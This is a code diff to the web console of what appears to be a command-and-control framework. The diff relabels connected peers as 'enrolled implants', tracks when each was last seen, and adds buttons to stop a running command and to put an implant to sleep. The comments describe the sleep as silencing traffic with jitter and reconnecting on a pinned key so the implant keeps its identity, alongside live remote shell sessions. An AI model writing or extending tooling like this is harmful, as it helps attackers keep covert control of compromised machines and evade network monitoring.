@@ -120,6 +120,12 @@
      width: 30px; height: 30px; border-radius: 8px; cursor: pointer; font-size: 16px;
    }
    .console-close:hover { border-color: var(--accent); }
+   #sleep-btn, #cancel-btn {
+     background: var(--panel-2); border: 1px solid var(--border); color: var(--muted);
+     height: 30px; padding: 0 12px; border-radius: 8px; cursor: pointer;
+     font-family: inherit; font-size: 12px;
+   }
+   #sleep-btn:hover, #cancel-btn:hover { border-color: var(--accent); color: var(--text); }
    #term-container {
      flex: 1; overflow: hidden;
    }
@@ -213,9 +219,9 @@
   <main>
     <section class="cards">
       <div class="card">
-        <div class="label">Connected peers</div>
+        <div class="label">Online</div>
         <div class="value" id="stat-peers">0</div>
-        <div class="sub" id="stat-peers-sub">devices online</div>
+        <div class="sub" id="stat-peers-sub">of the enrolled implants</div>
       </div>
       <div class="card">
         <div class="label">Network version</div>
@@ -252,7 +258,7 @@
            </thead>
            <tbody id="peers-body"></tbody>
          </table>
-         <div id="empty" class="empty">No peers connected yet.</div>
+         <div id="empty" class="empty">No implants enrolled yet.</div>
        </div>
      </section>
 
@@ -264,6 +270,8 @@
             <div class="meta" id="console-meta"></div>
           </div>
           <div style="display:flex;gap:8px;align-items:center;">
+            <button id="cancel-btn" title="Stop the command this peer is running, whoever started it. Does not affect the shell below.">Stop</button>
+            <button id="sleep-btn" title="Tell this peer to disconnect and stay off the network for 15 minutes">Sleep 15m</button>
             <button class="console-close" id="console-close" title="Close">&times;</button>
           </div>
         </div>
@@ -316,13 +324,23 @@
   function shortId(id) { return id ? id.slice(0, 8) + '…' : '—'; }
   function shortKey(k) { return k ? k.slice(0, 12) + '…' + k.slice(-6) : '—'; }
 
-  // Latest peer list, keyed by id, so console clicks have fresh data.
+  // Latest implant list, keyed by id, so console clicks have fresh data.
   var peersById = {};
 
-  function render(data) {
-    var peers = (data && data.peers) || [];
-    document.getElementById('stat-peers').textContent = peers.length;
-    document.getElementById('stat-version').textContent = data ? data.version : 0;
+  function ago(ms) {
+    if (!ms) return '—';
+    var s = Math.max(0, Math.round((Date.now() - ms) / 1000));
+    if (s < 60) return s + 's ago';
+    if (s < 3600) return Math.round(s / 60) + 'm ago';
+    if (s < 86400) return Math.round(s / 3600) + 'h ago';
+    return Math.round(s / 86400) + 'd ago';
+  }
+
+  function render(msg) {
+    var peers = (msg && (msg.implants || msg.peers)) || [];
+    document.getElementById('stat-peers').textContent =
+      peers.filter(function (p) { return p.online; }).length;
+    document.getElementById('stat-version').textContent = peers.length;
     var now = new Date();
     document.getElementById('stat-updated').textContent =
       now.toTimeString().slice(0, 8);
@@ -337,14 +355,16 @@
     } else {
       empty.style.display = 'none';
       peers.forEach(function (p) {
+        var on = !!p.online;
         var tr = document.createElement('tr');
         tr.className = 'clickable';
         tr.innerHTML =
           '<td>' + escapeHtml(p.name || 'unnamed') + '</td>' +
-          '<td class="mono">' + shortId(p.id) + '</td>' +
-          '<td class="mono">' + (p.ip || '—') + '</td>' +
-          '<td class="mono" title="' + escapeHtml(p.pubkey || '') + '">' + shortKey(p.pubkey) + '</td>' +
-          '<td><span class="pill"><span class="dot live" style="width:7px;height:7px;"></span>online</span></td>';
+          '<td class="mono" title="' + escapeHtml(p.id || '') + '">' + shortId(p.id) + '</td>' +
+          '<td class="mono">' + ago(p.lastSeen) + '</td>' +
+          '<td class="mono">' + (p.firstSeen ? ago(p.firstSeen).replace(/ ago$/, ' ago') : '—') + '</td>' +
+          '<td><span class="pill"><span class="dot ' + (on ? 'live' : '') +
+            '" style="width:7px;height:7px;"></span>' + (on ? 'online' : 'offline') + '</span></td>';
         tr.addEventListener('click', function () { openConsole(p.id); });
         body.appendChild(tr);
       });
@@ -380,7 +400,7 @@
     var p = peersById[id];
     if (!p) return;
     activePeerId = id;
-    consoleTitle.textContent = (p.name || 'unnamed') + '  (' + (p.ip || '') + ')';
+    consoleTitle.textContent = (p.name || 'unnamed') + (p.online ? '' : '  (offline)');
     consoleMeta.textContent = 'id ' + id;
     consoleEl.classList.add('open');
     markActive();
@@ -394,6 +414,35 @@
     consoleEl.classList.remove('open');
     activePeerId = null;
     markActive();
+  }
+
+  /* Put a peer to sleep. This is the only control that makes an idle host
+     generate no traffic at all: it drops the link, waits out the interval plus
+     jitter, and handshakes again on the same pinned key — so it comes back as
+     the same implant, not a new one. Fire-and-forget: the agent answers
+     nothing, so the UI acknowledges locally and the roster confirms it. */
+  function sleepPeer(seconds) {
+    if (!activePeerId) return;
+    var to = activePeerId;
+    ws.send(JSON.stringify({ type: 'sleep', to: to, ms: Math.round(seconds * 1000) }));
+    log('sleep ' + to.slice(0, 8) + '… for ' + Math.round(seconds / 60) + ' min');
+    closeConsole();
+  }
+
+  /* Stop whatever command this peer is running. The agent runs one at a time
+     and holds the slot until it finishes, so a hung command also refuses every
+     later one - this is the escape hatch, and it works even when the command
+     was started from another operator's session. The reply says whether there
+     was anything to stop, so an idle peer reports that instead of implying
+     success. It deliberately does not touch the shell on screen. */
+  var cancelSeq = 0;
+  var cancelPending = null;
+  function cancelPeer() {
+    if (!activePeerId) return;
+    var to = activePeerId;
+    cancelPending = 'cancel-' + (++cancelSeq);
+    ws.send(JSON.stringify({ type: 'cancel', to: to, id: cancelPending }));
+    log('stop requested on ' + to.slice(0, 8) + '\u2026');
   }
 
   /* --------------------------- Live terminal --------------------------- */
@@ -508,6 +557,9 @@
     markActive();
   });
 
+  document.getElementById('sleep-btn').addEventListener('click', function () { sleepPeer(900); });
+  document.getElementById('cancel-btn').addEventListener('click', function () { cancelPeer(); });
+
 
   var ws = null;
   var reconnectTimer = null;
@@ -537,10 +589,10 @@
           try { ws.close(); } catch (e) {}
           return;
         }
-        if (msg.type === 'map') {
+        if (msg.type === 'implants' || msg.type === 'map') {
           render(msg);
-          log('mesh update &middot; <b>' + (msg.peers ? msg.peers.length : 0) +
-              '</b> peer(s) &middot; v' + msg.version);
+          var n = (msg.implants || msg.peers || []).length;
+          log('implant update &middot; <b>' + n + '</b> enrolled');
         } else if (msg.type === 'term-data') {
           // streaming shell output for the active session (base64 payload)
           if (msg.id === termId && termActive && xterm) {
@@ -555,6 +607,13 @@
           }
         } else if (msg.type === 'term-end') {
           if (msg.id === termId && xterm) xterm.write('\r\n\x1b[33m--- session closed ---\x1b[0m\r\n');
+        } else if (msg.type === 'cancel-result') {
+          if (msg.id === cancelPending) {
+            cancelPending = null;
+            log(msg.rc === 0
+              ? 'command stopped &middot; its result arrives separately with rc=124'
+              : 'nothing was running on that peer');
+          }
         }
       } catch (e) { /* ignore */ }
     };
